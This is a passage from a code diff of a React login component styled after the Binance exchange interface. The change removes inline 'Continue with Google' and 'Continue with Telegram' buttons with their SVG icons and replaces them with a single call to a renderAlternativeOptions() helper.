-                      border: "1px solid var(--color-InputLine, #474D57)",
-                      color: "var(--color-PrimaryText, #EAECEF)",
-                      fontSize: "14px",
-                      fontWeight: "400",
-                      lineHeight: "20px",
-                      height: "48px"
-                    }}
-                    role="button" 
-                    aria-label="Continue with Google"
-                  >
-                    <div className="icon-warp mr-3">
-                      <svg width="24" height="24" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" className="bn-svg">
-                        <g clipPath="url(#clip0_2445_976)">
-                          <path fillRule="evenodd" clipRule="evenodd" d="M19.68 12.1818C19.68 11.6146 19.6291 11.0691 19.5345 10.5455H12V13.64H16.3055C16.12 14.64 15.5564 15.4873 14.7091 16.0546V18.0618H17.2945C18.8073 16.6691 19.68 14.6182 19.68 12.1818Z" fill="#4285F4" />
-                          <path fillRule="evenodd" clipRule="evenodd" d="M11.9997 20C14.1597 20 15.9706 19.2836 17.2942 18.0618L14.7088 16.0545C13.9924 16.5345 13.076 16.8182 11.9997 16.8182C9.91604 16.8182 8.1524 15.4109 7.52331 13.52H4.85059V15.5927C6.16695 18.2073 8.8724 20 11.9997 20Z" fill="#34A853" />
-                          <path fillRule="evenodd" clipRule="evenodd" d="M7.52364 13.52C7.36364 13.04 7.27273 12.5273 7.27273 12C7.27273 11.4727 7.36364 10.96 7.52364 10.48V8.40729H4.85091C4.30909 9.48729 4 10.7091 4 12C4 13.2909 4.30909 14.5127 4.85091 15.5927L7.52364 13.52Z" fill="#FBBC05" />
-                          <path fillRule="evenodd" clipRule="evenodd" d="M11.9997 7.18182C13.1742 7.18182 14.2288 7.58545 15.0579 8.37818L17.3524 6.08364C15.9669 4.79273 14.156 4 11.9997 4C8.8724 4 6.16695 5.79273 4.85059 8.40727L7.52331 10.48C8.1524 8.58909 9.91604 7.18182 11.9997 7.18182Z" fill="#EA4335" />
-                        </g>
-                        <defs>
-                          <clipPath id="clip0_2445_976">
-                            <rect width="16" height="16" fill="none" transform="translate(4 4)" />
-                          </clipPath>
-                        </defs>
-                      </svg>
-                    </div>
-                    <div>Continue with Google</div>
-                  </button>
-
-                  <button 
-                    className="w-full py-3 rounded flex items-center justify-center transition-colors hover:bg-[#2B3139] hover:border-[#848E9C] font-binance"
-                    style={{
-                      backgroundColor: "transparent",
-                      border: "1px solid var(--color-InputLine, #474D57)",
-                      color: "var(--color-PrimaryText, #EAECEF)",
-                      fontSize: "14px",
-                      fontWeight: "400",
-                      lineHeight: "20px",
-                      height: "48px"
-                    }}
-                    role="button" 
-                    aria-label="Continue with Telegram"
-                  >
-                    <div className="icon-warp mr-3">
-                      <svg height="24" width="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" className="bn-svg">
-                        <path d="M2.81274 9.27228C7.28665 7.32306 10.27 6.03802 11.7627 5.41715C16.0247 3.64445 16.9103 3.33651 17.4875 3.32634C17.6144 3.3241 17.8983 3.35557 18.0822 3.50477C18.2374 3.63075 18.2801 3.80094 18.3006 3.92038C18.321 4.03983 18.3465 4.31192 18.3263 4.52453C18.0953 6.95123 17.0959 12.8402 16.5875 15.5581C16.3724 16.7082 15.9488 17.0938 15.5387 17.1315C14.6475 17.2136 13.9707 16.5426 13.1076 15.9767C11.7568 15.0913 10.9938 14.5401 9.68265 13.6761C8.16744 12.6776 9.14969 12.1288 10.0132 11.232C10.2392 10.9972 14.1659 7.42557 14.2419 7.10157C14.2514 7.06104 14.2603 6.90999 14.1705 6.83024C14.0808 6.75048 13.9483 6.77775 13.8528 6.79944C13.7173 6.83019 11.5595 8.25641 7.37938 11.0781C6.7669 11.4987 6.21213 11.7036 5.71508 11.6929C5.16711 11.681 4.11306 11.383 3.32947 11.1283C2.36838 10.8159 1.60451 10.6507 1.67103 10.1202C1.70568 9.84381 2.08624 9.56118 2.81274 9.27228Z" fill="#00AEED" />
-                      </svg>
-                    </div>
-                    <div>Continue with Telegram</div>
-                  </button>
-                </div>
-              </>
-            )}
+            {renderAlternativeOptions()}
           </div>
         </div>
       </div>
